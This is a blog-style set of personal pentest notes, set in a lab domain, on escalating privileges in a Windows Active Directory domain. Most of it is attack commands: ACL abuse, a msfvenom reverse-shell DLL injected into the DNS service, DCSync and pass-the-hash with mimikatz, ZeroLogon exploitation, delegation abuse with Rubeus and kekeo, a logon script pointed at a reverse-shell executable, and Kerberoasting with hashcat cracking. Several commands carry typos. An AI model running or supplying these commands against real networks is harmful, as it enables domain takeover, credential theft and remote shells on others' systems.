---
title: Windows AD Domain Privilege Escalation
published: 2025-02-14
description: "Escalate Your Privilage In the Domain AD Environemant"
image: "./img/img.jpg"
tags: [Notes ,AD, windows]
category: 'Notes'
draft: true
---

# ACL - GenericAll on Group
## ACL - GenericAll on Group - DNSAdmin
```powershell
Get-DomainGroup -SamAccountName * -ResolveGUIDS | ? {($_.ActiveDirectoryRights -match 'GenericAll')}

Get-DomainGroup -SamAccountName * | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}

Get-DomainGroup -SamAccountName "DNSAdmins" | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
```

## Add user to domain admins
```powershell
Add-DomainGroupMember -Identity 'DnsAdmins' -Members 'student1'

Get-DomainGroupMember -SamAccountName 'DnsAdmins'

Get-ObjectAcl -ResolveGUIDs | ? {($_.objectdn -eq "CN=DNSAdmins,CN=Users,DC=pentesting,DC=local")}

Get-ObjectAcl -SamAccountName "DNSAdmins" -ResolveGUIDs
```

## First of, let's get its distinguishedName
```powershell
Get-DomainGroup -SamAccountName "DNSAdmins"

Get-ObjectAcl -ResolveGUIDs | ? {($_.objectdn -eq "CN=DNSAdmins,CN=Users,DC=pentesting,DC=local") -and ($_.ActiveDirectoryRights -match 'GenericAll')}

Get-ObjectAcl -ResolveGUIDs | ? {($_.objectdn -eq "CN=DNSAdmins,CN=Users,DC=pentesting,DC=local") -and ($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
```

## Add user to domain admins

```powershell
Add-DomainGroupMember -Identity 'DnsAdmins' -Members 'student1'

Get-DomainGroupMember -SamAccountName 'DnsAdmins'
```

# Priv Esc- DNSAdmins
## Find the members in the DNSAdmin
```bash
. .\powerview.ps1
Get-DomainGroup -SamAccountName "DNSAdmin"
Get-DomainGroupMember -Name "DNSAdmin"
```

In this method, we load an arbitrary DLL with SYSTEM privileges on the DNS server. i.e., We will build a DLL which contains reverse tcp code and inject it into dns.exe process on the #victim’s DNS Server (DC). In case your work requires building a DLL which exports all necessary functions refer this post or this screenshot for building the DLL instead of msfvenom. You #can also use remote dll injector.

## Building the DLL using msfvenom:
```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f dll > privesc.dll
```

## Python HTTP Server
```bash
python -m http.server 80
```

## Injecting the DLL in dns.exe
`C:\Windows\system32\dnscmd.exe`

```bash
dnscmd testmachine.test.local /config /serverlevelplugindll \\192.168.43.100\share\privesc.dll
```

Normally we cannot check if the dll was added, as it requires Administrator privileges, but in our case we did have an admin account, so we can check using the following command, from DC

```bash
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```

## Start Listening
```bash
. .\powercat.ps1
powercat -l -p 4444 -Verbose
```

## For restarting the server
```bash
sc.exe <FQDN of DC> stop dns
sc.exe <FQDN of DC> start dns
```

# DCSync

DCSync is a credential dumping technique that can lead to the compromise of individual user credentials, and more seriously as a prelude to the creation of a Golden Ticket, as DCSync can be used to compromise the krbtgt account’s password.

To perform a DCSync attack, an adversary must have compromised a user with the Replicating Directory Changes All and Replicating Directory Changes privileges. Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default. It is also possible for any user to be granted these specific privileges. Once obtained, an adversary uses the Directory Replication Service (DRS) Remote Protocol to replicate data (including credentials) from Active Directory.

The KRBTGT is a local default account that acts as a service account for the Key Distribution Center (KDC) service. It's created automatically when a new domain is created. It cannot be deleted. its name cannot be changed. it cannot be enabled.

KDC service handles all Kerberos ticket requests so KRBTGT account in AD plays a key role that encrypts and sign all Kerberos tickets for the domain.

```bash
Get-ForestGlobalCatalog
Get-DomainUser -Name student1

# Get the object ACL for the pentesting.local forest
Get-ObjectACL "DC=pentesting,DC=local" -ResolveGUIDs 

# Get the object ACL matching ObjectAceType = DS-Replication for the pentesting.local forest
Get-ObjectACL "DC=pentesting,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -like 'DS-Replication*')}

# Get the object ACL matching ObjectAceType = DS-Replication and SecurityIdentifier for my current user =  for the pentesting.local forest
Get-ObjectACL "DC=pentesting,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -like 'DS-Replication*') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }

# Get the all the ACL in the pentesting.local forest for my current SecurityIdentifier
Get-ObjectACL "DC=pentesting,DC=local" -ResolveGUIDs | ? { ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }

# dump the commands for administrator
import-module invoke-mimikatz
invoke-mimikatz -Command '"lsadump::dcsync /user:v.frizzle\administrator"'

# pass the hash to become the administrator
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:... /ntlm:... /run:powershell.exe"'

# see if we are administrator
invoke-command -ComputerName dc.pentesting.local -ScriptBlock{whoami;hostname}

# enter powershell session for the dc as the administrator
Enter-PSSession -ComputerName dc.pentesting.local
hostname
whoami
```

# ZeroLogon CVE-2020-1472

Zerologon, tracked as CVE-2020-1472, is an authentication bypass vulnerability in the Netlogon Remote Protocol (MS-NRPC), a remote procedure call (RPC) interface that Windows uses to authenticate users and computers on domain-based networks. It was designed for specific tasks such as maintaining relationships between members of domains and the domain controller (DC), or between multiple domain controllers across one or multiple domains and replicating the domain controller database.

```bash
cd mimikatz-master\x64
# See if it is vulnerable
lsadump::zerologon /target:dc.pentesting.local /account:dc$

# Exploit it
lsadump::zerologon /target:dc.pentesting.local /account:dc$ /exploit

# dcsync
lsadump::dcsync /dc:dc.pentesting.local /authuser:dc$ /authdomain:exploit.local /authpassword:"" /authntlm /user:krbtgt 

# Pass the hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:student5 /domain: /ntlm: /run:powershell.exe"'
```

- `/target` is the full fqdn of the target dc
- `/account` variable is the name of the dc followed by $

# Unconstrained delegation

```bash
powerhsell -ep bypass
import-module .\Powervien.ps1
Get-domainComputer -uncontrained

.\Rubeus.exe monitor /interval:1
# another PS
.\SpoolSample.exe dc.pnte.local studen.pente.local
.\Rubeus.exe ptt /ticket:dedede
.\Rubeus.exe triage
.\Rubeus.exe klist

import-module .\Invoke-Mimikatz.ps1
# then do dcsync attack
# pass the hash after getting the ntlm
```

# Contrained delegation


Kerberos constrained delegation was introduced in Windows Server 2003 to provide a safer form of delegation that could be used by services. 
When it is configured, constrained delegation restricts the services to which the specified server can act on the behalf of a user. 
This requires domain administrator privileges to configure a domain account for a service and is restricts the account to a single domain. 
In today's enterprise, front-end services are not designed to be limited to integration with only services in their domain.

```bash
# Enumerate
Get-DomainComputer -TrustedToAuth

# u can find it in msds-allowedtodelegateto

. .\Invoke-Mimikatz.ps1
invoke-mimikatz
# STUDENT$ ntlm aa81bb97a48748ad89541137bf78001f

# ask dc for a tgt for the student server
# Download kekeo:
https://github.com/gentilkiwi/kekeo/releases
kekeo.exe
tgt::ask /user:student$ /domain:pentesting.local /rc4:aa81bb97a48748ad89541137bf78001f

# ask dc for a tgs for the student server
tgs::s4u /tgt:TGT_student$@PENTESTING.LOCAL_krbtgt~pentesting.local@PENTESTING.LOCAL.kirbi /user:Administrator@pentesting.local /service:time/ad.pentesting.local|ldap/ad.pentesting.local

# use the tgs and inject it
. ..\..\invoke-mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@pentesting.local@PENTESTING.LOCAL_student$@PENTESTING.LOCAL.kirbi"'

# Dcsync to perform a goldent ticket attack
Invoke-Mimikatz -Command '"lsadump::dcsync /user:pentesting\krbtgt"'
```

# ACL - GenericWrite on User

WriteProperty on an ObjectType allow us to modify/overwrite the Script-Path, which means that the next time, when the user logs on, their system will execute our malicious script:

## Enumerate to find all objects with GenericWrite
```bash
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite')}
```

## Enumerate to find all objects with GenericWrite and for my current username
```bash
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
```

## Enumerate to find ippsec with GenericWrite and for my current username
```bash
Get-ObjectAcl -SamAccountName "ippsec" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
```

## Building the EXE using msfvenom:
```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f exe > privesc.exe
```

## create a shared folder and add it there and allow everyone to access it
```bash
Get-DomainUser -Identity testuser -Properties scriptpath

$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force 

$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword) 

Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe'}  -Credential $Cred -Verbose 

Get-DomainUser -Identity testuser -Properties scriptpath
```

# SET-SPN - Kerberoast

look for account
- generic write access
- generic all access

then u can set the SPN

```bash
. .\Invoke-Kerberoast.ps1
invoke-kerberoast 
# if didnt work look for account u have generic write on it
.\Powerview.ps1
Get-ObjectAcl -SamAcc...

Get-DomainUser -Identity hadams | selsct serviceprincipalname
Set-DomainObject -Identity hadams -Set @{serviceprincipalname='ops/whatever1'}
Get-DomainUser -Identity hadams | selsct serviceprincipalname

. .\Invoke-Kerberoast.ps1
invoke-kerberoast 

# break it with hashcat
invoke-kerberoast  -OutputFormat Hashcat > hash.txt

. .\Powerview.ps1
Get-DomainUser -SamAccountName hadams
Get-DomainComputer
```

# Targeted Kerberoasting - AS-REPs - FINDING

The ASREPRoast attack looks for users without Kerberos pre-aut6hentication required attribute (DONT_REQ_PREAUTH).

That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. 
This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

Furthermore, no domain account is needed to perform this attack, only connection to the DC. However, with a domain account, a LDAP query can be used to retrieve users without Kerberos pre-authentication in the domain. Otherwise usernames have to be guessed.


```bash
# see if the account you disabled appears
Get-DomainUser -PreauthNotRequired -Verbose
.\ASREPRoast.ps1
Inovke-ASREPRoast -Verbose
# ---------------------Abuse it---------------
# Export hash
.\Rubeus.exe asreproast /format:hashcat /outfile:s4vitar.asreproast

# Using bleeding-jumbo branch of John The Ripper, we can brute-force the hashes offline.
./john s4vitar.asreproast --wordlist=rockyou.txt
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```

# Targeted Kerberoasting - AS-REPs - SET

The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).

That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. 
This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.

Furthermore, no domain account is needed to perform this attack, only connection to the DC. However, with a domain account, a LDAP query can be used to retrieve users without Kerberos pre-authentication in the domain. Otherwise usernames have to be guessed.

```bash
# see if the account you disabled appears
Get-DomainUser -PreauthNotRequired -Verbose

# If you do not find anything, you can look if you can set the PreauthNotRequired with ACL  GenericAll or GenericWrite
# Import Module
. .\powerview.ps1

# Get your SID
whoami
Get-DomainUser -SamAccountName Student1

# GenericAll
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}

# GenericWrite
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}

# Disable the DoesnotRequirePreAuth for a user
Set-DomainObject -Identity hadams -XOR @{useraccountcontrol=4194304} –Verbose


# ---------------------Abuse it---------------
# Export Hashes
.\Rubeus.exe asreproast /format:hashcat /outfile:hadams.asreproast


# crack offline
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 


# Set it back to normal
Set-DomainObject -Identity hadams -XOR @{useraccountcontrol=512} –Verbose

# Enter-PSSession
```

